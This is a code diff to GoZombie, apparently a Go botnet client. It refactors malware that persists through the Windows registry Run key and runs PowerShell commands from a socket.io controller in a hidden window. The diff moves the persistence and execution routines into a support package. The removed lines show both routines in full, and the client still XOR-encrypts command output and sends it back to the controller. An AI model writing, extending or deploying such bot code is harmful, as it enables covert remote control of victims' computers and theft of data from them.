@@ -7,13 +7,12 @@ import (
 	"github.com/UPSJustin/GoZombie/zsupport" //support functions
 	"github.com/UPSJustin/GoZombie/xor" //xor ftw
 	"github.com/zhouhui8915/go-socket.io-client" //websockets
-	"golang.org/x/sys/windows/registry" //registry
 	"log"
 	"os"
 	"os/exec"
 	"runtime"
 	"strings"
-	"syscall"
+//	"syscall"
 )
 
 var (
@@ -23,14 +22,7 @@ var (
 
 
 
-//Set Persistence
 
-func RegisterAutoRun() error {
-	zsupport.OutMessage("Activated Persistence")
-	err := zsupport.WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, zombieName, fullPathBotSourceExecFile)
-	zsupport.CheckError(err)
-	return err
-}
 
 func main() {
 	//Key for XOR Encryption
@@ -70,7 +62,7 @@ func main() {
 
 		if strings.Contains(msg, "persistence") {
 
-			RegisterAutoRun()
+		zsupport.RegisterAutoRun(zombieName, fullPathBotSourceExecFile)
 
 		}
 
@@ -97,19 +89,12 @@ func main() {
 				
 				//execute windows shell
 				
-				
-				cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output[1]))
-				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-				cmdOutput := &bytes.Buffer{}
-				cmd.Stdout = cmdOutput
-				err := cmd.Run()
-				if err != nil {
-					os.Stderr.WriteString(err.Error())
-				}
+				output := fmt.Sprintf(`%s`, output[1])
 
-				encryptmsg := xor.EncryptDecrypt(string(cmdOutput.Bytes()), key)
-				client.Emit("jnkcyp", encryptmsg)
-			}
+			encryptmsg := zsupport.ExecWindows(output)
+
+				client.Emit("jnkcyp", encryptmsg)			
+}
 		}
 		
 
